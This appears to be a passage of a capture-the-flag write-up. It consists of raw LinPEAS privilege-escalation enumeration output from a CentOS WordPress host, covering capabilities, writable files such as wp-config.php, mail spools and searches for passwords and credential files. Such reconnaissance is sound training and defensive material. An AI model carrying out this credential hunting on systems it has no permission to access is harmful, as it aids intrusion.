\-\--x\--s\--x. 1 root ssh_keys 455K Aug 9 2019 /usr/libexec/openssh/ssh-keysign

 

╔══════════╣ Checking misconfigurations of ld.so

╚ <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so>

/etc/ld.so.conf

Content of /etc/ld.so.conf:

include ld.so.conf.d/\*.conf

ld.so.conf.d

ld.so.conf.d/\*

cat: ld.so.conf.d/\*: No such file or directory

 

/etc/ld.so.preload

╔══════════╣ Capabilities

╚ <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities>

══╣ Current shell capabilities

CapInh: 0x0000000000000000=

CapPrm: 0x0000000000000000=

CapEff: 0x0000000000000000=

CapBnd: 0x0000001fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_n

et_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_s

ys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_overrid

e,cap_mac_admin,cap_syslog,35,36

CapAmb: 0x0000000000000000=

 

══╣ Parent process capabilities

CapInh: 0x0000000000000000=

CapPrm: 0x0000000000000000=

CapEff: 0x0000000000000000=

CapBnd: 0x0000001fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_n

et_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_s

ys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_overrid

e,cap_mac_admin,cap_syslog,35,36

CapAmb: 0x0000000000000000=

 

 

Files with capabilities (limited to 50):

/usr/bin/newgidmap = cap_setgid+ep

/usr/bin/newuidmap = cap_setuid+ep

/usr/bin/ping = cap_net_admin,cap_net_raw+p

/usr/sbin/arping = cap_net_raw+p

/usr/sbin/clockdiff = cap_net_raw+p

/usr/sbin/suexec = cap_setgid,cap_setuid+ep

 

╔══════════╣ Files with ACLs (limited to 50)

╚ <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls>

files with acls in searched folders Not Found

 

╔══════════╣ Files (scripts) in /etc/profile.d/

╚ <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files>

total 68

drwxr-xr-x. 2 root root 251 Oct 9 2020 .

drwxr-xr-x. 81 root root 8192 Dec 16 15:06 ..

-rw-r\--r\--. 1 root root 771 Apr 1 2020 256term.csh

-rw-r\--r\--. 1 root root 841 Apr 1 2020 256term.sh

-rw-r\--r\--. 1 root root 196 Mar 24 2017 colorgrep.csh

-rw-r\--r\--. 1 root root 201 Mar 24 2017 colorgrep.sh

-rw-r\--r\--. 1 root root 1741 Aug 6 2019 colorls.csh

-rw-r\--r\--. 1 root root 1606 Aug 6 2019 colorls.sh

-rw-r\--r\--. 1 root root 80 Apr 1 2020 csh.local

-rw-r\--r\--. 1 root root 1706 Apr 1 2020 lang.csh

-rw-r\--r\--. 1 root root 2703 Apr 1 2020 lang.sh

-rw-r\--r\--. 1 root root 123 Jul 30 2015 less.csh

-rw-r\--r\--. 1 root root 121 Jul 30 2015 less.sh

-rw-r\--r\--. 1 root root 81 Apr 1 2020 sh.local

-rw-r\--r\--. 1 root root 164 Jan 27 2014 which2.csh

-rw-r\--r\--. 1 root root 169 Jan 27 2014 which2.sh

 

╔══════════╣ Permissions in init, init.d, systemd, and rc.d

╚ <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d>

 

═╣ Hashes inside passwd file? \...\...\..... No

═╣ Writable passwd file? \...\...\...\...\.... No

═╣ Credentials in fstab/mtab? \...\...\..... No

═╣ Can I read shadow files? \...\...\...\.... No

═╣ Can I read shadow plists? \...\...\...\... No

═╣ Can I write shadow plists? \...\...\..... No

═╣ Can I read opasswd file? \...\...\...\.... No

═╣ Can I write in network-scripts? \...\... No

═╣ Can I read root folder? \...\...\...\..... No

 

╔══════════╣ Searching root files in home dirs (limit 30)

/home/

/root/

/var/www

/var/www/cgi-bin

/usr/share/httpd

/usr/share/httpd/error

/usr/share/httpd/error/HTTP_BAD_GATEWAY.html.var

/usr/share/httpd/error/HTTP_BAD_REQUEST.html.var

/usr/share/httpd/error/HTTP_FORBIDDEN.html.var

/usr/share/httpd/error/HTTP_GONE.html.var

/usr/share/httpd/error/HTTP_INTERNAL_SERVER_ERROR.html.var

/usr/share/httpd/error/HTTP_LENGTH_REQUIRED.html.var

/usr/share/httpd/error/HTTP_METHOD_NOT_ALLOWED.html.var

/usr/share/httpd/error/HTTP_NOT_FOUND.html.var

/usr/share/httpd/error/HTTP_NOT_IMPLEMENTED.html.var

/usr/share/httpd/error/HTTP_PRECONDITION_FAILED.html.var

/usr/share/httpd/error/HTTP_REQUEST_ENTITY_TOO_LARGE.html.var

/usr/share/httpd/error/HTTP_REQUEST_TIME_OUT.html.var

/usr/share/httpd/error/HTTP_REQUEST_URI_TOO_LARGE.html.var

/usr/share/httpd/error/HTTP_SERVICE_UNAVAILABLE.html.var

/usr/share/httpd/error/HTTP_UNAUTHORIZED.html.var

/usr/share/httpd/error/HTTP_UNSUPPORTED_MEDIA_TYPE.html.var

/usr/share/httpd/error/HTTP_VARIANT_ALSO_VARIES.html.var

/usr/share/httpd/error/README

/usr/share/httpd/error/contact.html.var

/usr/share/httpd/error/include

/usr/share/httpd/error/include/bottom.html

/usr/share/httpd/error/include/spacer.html

/usr/share/httpd/error/include/top.html

/usr/share/httpd/icons

 

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)

 

╔══════════╣ Readable files belonging to root and readable by me but not world readable

 

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)

╚ <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files>

/dev/mqueue

/dev/shm

/home/metactf

/run/user/1001

/tmp

/tmp/.font-unix

/tmp/.ICE-unix

/tmp/.Test-unix

/tmp/.X11-unix

/tmp/.XIM-unix

/var/spool/mail/metactf

/var/tmp

/var/tmp/cloud-init

/var/tmp/yum-metactf-d4zGWo

/var/tmp/yum-metactf-d4zGWo/x86_64

/var/tmp/yum-metactf-d4zGWo/x86_64/7

/var/tmp/yum-metactf-d4zGWo/x86_64/7/base

/var/tmp/yum-metactf-d4zGWo/x86_64/7/base/cachecookie

/var/tmp/yum-metactf-d4zGWo/x86_64/7/base/gen

/var/tmp/yum-metactf-d4zGWo/x86_64/7/base/mirrorlist.txt

/var/tmp/yum-metactf-d4zGWo/x86_64/7/base/packages

/var/tmp/yum-metactf-d4zGWo/x86_64/7/base/repomd.xml

/var/tmp/yum-metactf-d4zGWo/x86_64/7/epel

/var/tmp/yum-metactf-d4zGWo/x86_64/7/epel/cachecookie

/var/tmp/yum-metactf-d4zGWo/x86_64/7/epel/gen

/var/tmp/yum-metactf-d4zGWo/x86_64/7/epel/metalink.xml

/var/tmp/yum-metactf-d4zGWo/x86_64/7/epel/packages

/var/tmp/yum-metactf-d4zGWo/x86_64/7/epel/repomd.xml

/var/tmp/yum-metactf-d4zGWo/x86_64/7/extras

/var/tmp/yum-metactf-d4zGWo/x86_64/7/extras/cachecookie

/var/tmp/yum-metactf-d4zGWo/x86_64/7/extras/gen

/var/tmp/yum-metactf-d4zGWo/x86_64/7/extras/mirrorlist.txt

/var/tmp/yum-metactf-d4zGWo/x86_64/7/extras/packages

/var/tmp/yum-metactf-d4zGWo/x86_64/7/extras/repomd.xml

/var/tmp/yum-metactf-d4zGWo/x86_64/7/remi-php72

/var/tmp/yum-metactf-d4zGWo/x86_64/7/remi-php72/cachecookie

/var/tmp/yum-metactf-d4zGWo/x86_64/7/remi-php72/gen

/var/tmp/yum-metactf-d4zGWo/x86_64/7/remi-php72/mirrorlist.txt

/var/tmp/yum-metactf-d4zGWo/x86_64/7/remi-php72/packages

/var/tmp/yum-metactf-d4zGWo/x86_64/7/remi-php72/repomd.xml

/var/tmp/yum-metactf-d4zGWo/x86_64/7/remi-safe

/var/tmp/yum-metactf-d4zGWo/x86_64/7/remi-safe/cachecookie

/var/tmp/yum-metactf-d4zGWo/x86_64/7/remi-safe/gen

/var/tmp/yum-metactf-d4zGWo/x86_64/7/remi-safe/mirrorlist.txt

/var/tmp/yum-metactf-d4zGWo/x86_64/7/remi-safe/packages

/var/tmp/yum-metactf-d4zGWo/x86_64/7/remi-safe/repomd.xml

/var/tmp/yum-metactf-d4zGWo/x86_64/7/updates

/var/tmp/yum-metactf-d4zGWo/x86_64/7/updates/cachecookie

/var/tmp/yum-metactf-d4zGWo/x86_64/7/updates/gen

/var/tmp/yum-metactf-d4zGWo/x86_64/7/updates/mirrorlist.txt

/var/tmp/yum-metactf-d4zGWo/x86_64/7/updates/packages

/var/tmp/yum-metactf-d4zGWo/x86_64/7/updates/repomd.xml

/var/www/html/wp-config.php

 

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)

╚ <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files>

 

 

 

╔═════════════════════════╗

════════════════════════════╣ Other Interesting Files ╠════════════════════════════

╚═════════════════════════╝

╔══════════╣ .sh files in path

╚ <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path>

/usr/bin/lesspipe.sh

/usr/bin/gettext.sh

/usr/bin/setup-nsssysinit.sh

/usr/bin/rescan-scsi-bus.sh

 

╔══════════╣ Executable files potentially added by user (limit 70)

2020-10-10+06:37:05.4476181430 /usr/local/bin/chardetect

2020-02-29+12:11:17.2923496530 /boot/vmlinuz-0-rescue-3d5c05376530a2eb49e3e90576f83c5b

 

╔══════════╣ Unexpected in root

/.autorelabel

 

╔══════════╣ Modified interesting files in the last 5mins (limit 100)

/var/log/wtmp

/var/log/lastlog

/var/log/cron

/var/log/messages

/var/log/secure

/home/metactf/.gnupg/gpg.conf

/home/metactf/.gnupg/pubring.gpg

/home/metactf/.gnupg/trustdb.gpg

 

logrotate 3.8.6

 

╔══════════╣ Files inside /home/metactf (limit 20)

total 16

\-\-\-\-\-\-\-\-\-- 1 metactf metactf 54 Oct 10 2020

drwx\-\-\-\-\-- 4 metactf metactf 122 Dec 16 17:16 .

drwxr-xr-x. 4 root root 35 Oct 10 2020 ..

lrwxrwxrwx 1 metactf metactf 9 Oct 10 2020 .bash_history -\> /dev/null

-rw-r\--r\-- 1 metactf metactf 18 Apr 1 2020 .bash_logout

-rw-r\--r\-- 1 metactf metactf 193 Apr 1 2020 .bash_profile

-rw-r\--r\-- 1 metactf metactf 231 Apr 1 2020 .bashrc

drwx\-\-\-\-\-- 2 metactf metactf 60 Dec 16 17:20 .gnupg

drwxrw\-\-\-- 3 metactf metactf 19 Dec 16 17:14 .pki

 

╔══════════╣ Files inside others home (limit 20)

/var/www/html/wp-admin/css/colors/blue/colors-rtl.css

/var/www/html/wp-admin/css/colors/blue/colors-rtl.min.css

/var/www/html/wp-admin/css/colors/blue/colors.css

/var/www/html/wp-admin/css/colors/blue/colors.min.css

/var/www/html/wp-admin/css/colors/blue/colors.scss

/var/www/html/wp-admin/css/colors/coffee/colors-rtl.css

/var/www/html/wp-admin/css/colors/coffee/colors-rtl.min.css

/var/www/html/wp-admin/css/colors/coffee/colors.css

/var/www/html/wp-admin/css/colors/coffee/colors.min.css

/var/www/html/wp-admin/css/colors/coffee/colors.scss

/var/www/html/wp-admin/css/colors/ectoplasm/colors-rtl.css

/var/www/html/wp-admin/css/colors/ectoplasm/colors-rtl.min.css

/var/www/html/wp-admin/css/colors/ectoplasm/colors.css

/var/www/html/wp-admin/css/colors/ectoplasm/colors.min.css

/var/www/html/wp-admin/css/colors/ectoplasm/colors.scss

/var/www/html/wp-admin/css/colors/light/colors-rtl.css

/var/www/html/wp-admin/css/colors/light/colors-rtl.min.css

/var/www/html/wp-admin/css/colors/light/colors.css

/var/www/html/wp-admin/css/colors/light/colors.min.css

/var/www/html/wp-admin/css/colors/light/colors.scss

 

╔══════════╣ Searching installed mail applications

mailq.postfix

newaliases.postfix

postfix

rmail.postfix

sendmail

sendmail.postfix

 

╔══════════╣ Mails (limit 50)

4576558 0 -rw-rw\-\-\-- 1 rpc mail 0 Feb 29 2020 /var/mail/rpc

4195599 0 -rw-rw\-\-\-- 1 centos mail 0 Oct 9 2020 /var/mail/centos

4390518 4 -rw\-\-\-\-\-\-- 1 root mail 3666 Oct 13 2020 /var/mail/root

4449651 0 -rw-rw\-\-\-- 1 metactf mail 0 Oct 10 2020 /var/mail/metactf

4576558 0 -rw-rw\-\-\-- 1 rpc mail 0 Feb 29 2020 /var/spool/mail/rpc

4195599 0 -rw-rw\-\-\-- 1 centos mail 0 Oct 9 2020 /var/spool/mail/centos

4390518 4 -rw\-\-\-\-\-\-- 1 root mail 3666 Oct 13 2020 /var/spool/mail/root

4449651 0 -rw-rw\-\-\-- 1 metactf mail 0 Oct 10 2020 /var/spool/mail/metactf

 

╔══════════╣ Backup files (limited 100)

-rw-r\--r\--. 1 root root 1938 Aug 6 2019 /etc/nsswitch.conf.bak

-rw-r\--r\-- 1 root root 28713 Dec 16 15:25 /var/log/dmesg.old

-rw-r\--r\--. 1 root root 2280 Feb 4 2020 /usr/lib/modules/3.10.0-1062.12.1.el7.x86_64/kernel/drivers/net/team/team_mode_activebackup.ko.xz

-rw-r\--r\--. 1 root root 2280 Aug 25 2020 /usr/lib/modules/3.10.0-1127.19.1.el7.x86_64/kernel/drivers/net/team/team_mode_activebackup.ko.xz

-rw-r\--r\--. 1 root root 475 Aug 19 2019 /usr/share/doc/initscripts-9.49.49/examples/networking/ifcfg-bond-activebackup-arpmon

-rw-r\--r\--. 1 root root 393 Aug 19 2019 /usr/share/doc/initscripts-9.49.49/examples/networking/ifcfg-bond-activebackup-miimon

-rw-r\--r\--. 1 root root 305 Dec 9 2018 /usr/share/doc/teamd-1.29/example_configs/activebackup_arp_ping_1.conf

-rw-r\--r\--. 1 root root 465 Dec 9 2018 /usr/share/doc/teamd-1.29/example_configs/activebackup_arp_ping_2.conf

-rw-r\--r\--. 1 root root 194 Dec 9 2018 /usr/share/doc/teamd-1.29/example_configs/activebackup_ethtool_1.conf

-rw-r\--r\--. 1 root root 212 Dec 9 2018 /usr/share/doc/teamd-1.29/example_configs/activebackup_ethtool_2.conf

-rw-r\--r\--. 1 root root 241 Dec 9 2018 /usr/share/doc/teamd-1.29/example_configs/activebackup_ethtool_3.conf

-rw-r\--r\--. 1 root root 447 Dec 9 2018 /usr/share/doc/teamd-1.29/example_configs/activebackup_multi_lw_1.conf

-rw-r\--r\--. 1 root root 285 Dec 9 2018 /usr/share/doc/teamd-1.29/example_configs/activebackup_nsna_ping_1.conf

-rw-r\--r\--. 1 root root 318 Dec 9 2018 /usr/share/doc/teamd-1.29/example_configs/activebackup_tipc.conf

-rw-r\--r\--. 1 root root 2761 Aug 9 2019 /usr/share/man/man1/db_hotbackup.1.gz

 

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)

Found /etc/aliases.db: Berkeley DB (Hash, version 9, native byte-order)

Found /etc/openldap/certs/cert8.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)

Found /etc/openldap/certs/key3.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)

Found /etc/openldap/certs/secmod.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)

Found /etc/pki/nssdb/cert8.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)

Found /etc/pki/nssdb/cert9.db: SQLite 3.x database

Found /etc/pki/nssdb/key3.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)

Found /etc/pki/nssdb/key4.db: SQLite 3.x database

Found /etc/pki/nssdb/secmod.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)

Found /var/lib/yum/history/history-2020-10-09.sqlite: regular file, no read permission

 

-\> Extracting tables from /etc/pki/nssdb/cert9.db (limit 20)

-\> Extracting tables from /etc/pki/nssdb/key4.db (limit 20)

 

╔══════════╣ Web files?(output limit)

/var/www/:

total 4.0K

drwxr-xr-x. 4 root root 33 Oct 10 2020 .

drwxr-xr-x. 20 root root 278 Oct 10 2020 ..

drwxr-xr-x. 2 root root 6 Apr 2 2020 cgi-bin

drwxrwxr-x. 5 apache apache 4.0K Oct 10 2020 html

 

/var/www/cgi-bin:

total 0

drwxr-xr-x. 2 root root 6 Apr 2 2020 .

 

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)

-rw-r\--r\-- 1 root root 20 Dec 16 16:52 /run/cloud-init/.instance-id

-rw-r\--r\-- 1 root root 2 Dec 16 16:47 /run/cloud-init/.ds-identify.result

-rw-r\--r\--. 1 root root 18 Apr 1 2020 /etc/skel/.bash_logout

-rw-r\--r\--. 1 root root 129 Jun 30 2020 /etc/selinux/targeted/.policy.sha512

-rw\-\-\-\-\-\--. 1 root root 0 Feb 29 2020 /etc/.pwd.lock

-rw-r\--r\--. 1 root root 163 Feb 29 2020 /etc/.updated

-rw-r\--r\--. 1 root root 0 Feb 29 2020 /var/lib/rpm/.rpm.lock

-rw-r\--r\--. 1 root root 163 Feb 29 2020 /var/.updated

-rw-rw-r\--. 1 apache apache 629 May 9 2016 /var/www/html/wp-content/plugins/akismet/.htaccess

-rw-rw-r\--. 1 apache apache 269 Oct 25 2019 /var/www/html/wp-content/themes/twentytwenty/.stylelintrc.json

-rw-r\--r\-- 1 apache apache 461 Oct 10 2020 /var/www/html/.htaccess

-rw-r\--r\--. 1 root root 65 Aug 2 2017 /usr/lib64/.libgcrypt.so.11.hmac

-rw-r\--r\--. 1 root root 65 Aug 9 2019 /usr/lib64/.libcrypto.so.1.0.2k.hmac

-rw-r\--r\--. 1 root root 65 Aug 9 2019 /usr/lib64/.libssl.so.1.0.2k.hmac

-rw-r\--r\--. 1 root root 40 Apr 1 2020 /usr/share/man/man1/..1.gz

-rw-r\--r\--. 1 root root 42 Apr 1 2020 /usr/share/man/man5/.k5identity.5.gz

-rw-r\--r\--. 1 root root 2328 Apr 23 2013 /usr/share/kde4/apps/kdm/themes/CentOS7/.colorlsCZ1

-rw-r\--r\--. 1 root root 172 Feb 4 2020 /boot/.vmlinuz-3.10.0-1062.12.1.el7.x86_64.hmac

-rw-r\--r\--. 1 root root 172 Aug 25 2020 /boot/.vmlinuz-3.10.0-1127.19.1.el7.x86_64.hmac

-rw-r\--r\-- 1 root root 0 Oct 10 2020 /.autorelabel

 

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)

-rw-r\--r\-- 1 metactf metactf 3736 Apr 27 2020 /var/tmp/yum-metactf-d4zGWo/x86_64/7/base/repomd.xml

-rw-r\--r\-- 1 metactf metactf 0 Oct 14 2020 /var/tmp/yum-metactf-d4zGWo/x86_64/7/base/cachecookie

-rw-r\--r\-- 1 metactf metactf 102 Oct 14 2020 /var/tmp/yum-metactf-d4zGWo/x86_64/7/base/mirrorlist.txt

-rw-r\--r\-- 1 metactf metactf 4849 Oct 12 2020 /var/tmp/yum-metactf-d4zGWo/x86_64/7/epel/repomd.xml

-rw-r\--r\-- 1 metactf metactf 0 Oct 14 2020 /var/tmp/yum-metactf-d4zGWo/x86_64/7/epel/cachecookie

-rw-r\--r\-- 1 metactf metactf 7609 Oct 14 2020 /var/tmp/yum-metactf-d4zGWo/x86_64/7/epel/metalink.xml

-rw-r\--r\-- 1 metactf metactf 2994 Aug 7 2020 /var/tmp/yum-metactf-d4zGWo/x86_64/7/extras/repomd.xml

-rw-r\--r\-- 1 metactf metactf 0 Oct 14 2020 /var/tmp/yum-metactf-d4zGWo/x86_64/7/extras/cachecookie

-rw-r\--r\-- 1 metactf metactf 110 Oct 14 2020 /var/tmp/yum-metactf-d4zGWo/x86_64/7/extras/mirrorlist.txt

-rw-r\--r\-- 1 metactf metactf 3097 Oct 12 2020 /var/tmp/yum-metactf-d4zGWo/x86_64/7/remi-php72/repomd.xml

-rw-r\--r\-- 1 metactf metactf 0 Oct 14 2020 /var/tmp/yum-metactf-d4zGWo/x86_64/7/remi-php72/cachecookie

-rw-r\--r\-- 1 metactf metactf 3631 Oct 14 2020 /var/tmp/yum-metactf-d4zGWo/x86_64/7/remi-php72/mirrorlist.txt

-rw-r\--r\-- 1 metactf metactf 3107 Oct 13 2020 /var/tmp/yum-metactf-d4zGWo/x86_64/7/remi-safe/repomd.xml

-rw-r\--r\-- 1 metactf metactf 0 Oct 14 2020 /var/tmp/yum-metactf-d4zGWo/x86_64/7/remi-safe/cachecookie

-rw-r\--r\-- 1 metactf metactf 3694 Oct 14 2020 /var/tmp/yum-metactf-d4zGWo/x86_64/7/remi-safe/mirrorlist.txt

-rw-r\--r\-- 1 metactf metactf 3007 Sep 14 2020 /var/tmp/yum-metactf-d4zGWo/x86_64/7/updates/repomd.xml

-rw-r\--r\-- 1 metactf metactf 0 Oct 14 2020 /var/tmp/yum-metactf-d4zGWo/x86_64/7/updates/cachecookie

-rw-r\--r\-- 1 metactf metactf 112 Oct 14 2020 /var/tmp/yum-metactf-d4zGWo/x86_64/7/updates/mirrorlist.txt

 

╔══════════╣ Searching passwords in history files

 

╔══════════╣ Searching passwords in config PHP files

/var/www/html/wp-admin/setup-config.php:\$pwd = trim( wp_unslash( \$\_POST\[\'pwd\'\] ) );

 

╔══════════╣ Searching \*password\* or \*credential\* files in home (limit 70)

/etc/openldap/certs/password

/etc/pam.d/password-auth

/etc/pam.d/password-auth-ac

/usr/bin/systemd-ask-password

/usr/bin/systemd-tty-ask-password-agent

/usr/lib64/mysql/plugin/mysql_clear_password.so

/usr/libexec/git-core/git-credential

/usr/libexec/git-core/git-credential-cache

/usr/libexec/git-core/git-credential-cache\--daemon

/usr/libexec/git-core/git-credential-store

#)There are more creds/passwds files in the previous parent folder

 

/usr/lib/grub/i386-pc/password.mod

/usr/lib/grub/i386-pc/password_pbkdf2.mod

/usr/lib/python2.7/site-packages/cloudinit/config/cc_set_passwords.py

/usr/lib/python2.7/site-packages/cloudinit/config/cc_set_passwords.pyc

/usr/lib/python2.7/site-packages/cloudinit/config/cc_set_passwords.pyo

/usr/lib/systemd/systemd-reply-password

/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path

/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path

/usr/lib/systemd/system/systemd-ask-password-console.path

/usr/lib/systemd/system/systemd-ask-password-console.service

/usr/lib/systemd/system/systemd-ask-password-wall.path

/usr/lib/systemd/system/systemd-ask-password-wall.service

#)There are more creds/passwds files in the previous parent folder

 

/usr/share/doc/git-1.8.3.1/contrib/credential

/usr/share/doc/git-1.8.3.1/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c

/usr/share/doc/git-1.8.3.1/contrib/credential/netrc/git-credential-netrc

/usr/share/doc/git-1.8.3.1/contrib/credential/osxkeychain/git-credential-osxkeychain.c

/usr/share/doc/git-1.8.3.1/contrib/credential/wincred/git-credential-wincred.c

/usr/share/doc/git-1.8.3.1/git-credential-cache\--daemon.html

/usr/share/doc/git-1.8.3.1/git-credential-cache\--daemon.txt

/usr/share/doc/git-1.8.3.1/git-credential-cache.html

/usr/share/doc/git-1.8.3.1/git-credential-cache.txt

#)There are more creds/passwds files in the previous parent folder

 

/usr/share/doc/git-1.8.3.1/technical/api-credentials.txt

/usr/share/doc/openssh-7.4p1/PROTOCOL.key

/usr/share/man/man1/git-credential.1.gz

/usr/share/man/man1/git-credential-cache.1.gz

/usr/share/man/man1/git-credential-cache\--daemon.1.gz

/usr/share/man/man1/git-credential-store.1.gz

#)There are more creds/passwds files in the previous parent folder

 

/usr/share/man/man5/password-auth-ac.5.gz

/usr/share/man/man7/gitcredentials.7.gz

/usr/share/man/man8/grub2-setpassword.8.gz

/usr/share/man/man8/systemd-ask-password-console.path.8.gz

/usr/share/man/man8/systemd-ask-password-console.service.8.gz

/usr/share/man/man8/systemd-ask-password-wall.path.8.gz

#)There are more creds/passwds files in the previous parent folder

 

/var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords

/var/www/html/wp-admin/js/password-strength-meter.js

/var/www/html/wp-admin/js/password-strength-meter.min.js

 

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

 

╔══════════╣ Searching passwords inside logs (limit 70)

\[ 4.461140\] systemd\[1\]: Started Dispatch Password Requests to Console Directory Watch.

\[ 4.959812\] systemd\[1\]: Started Dispatch Password Requests to Console Directory Watch.

 

![](media/image11.png){width="2.0625in" height="0.3958333333333333in"}
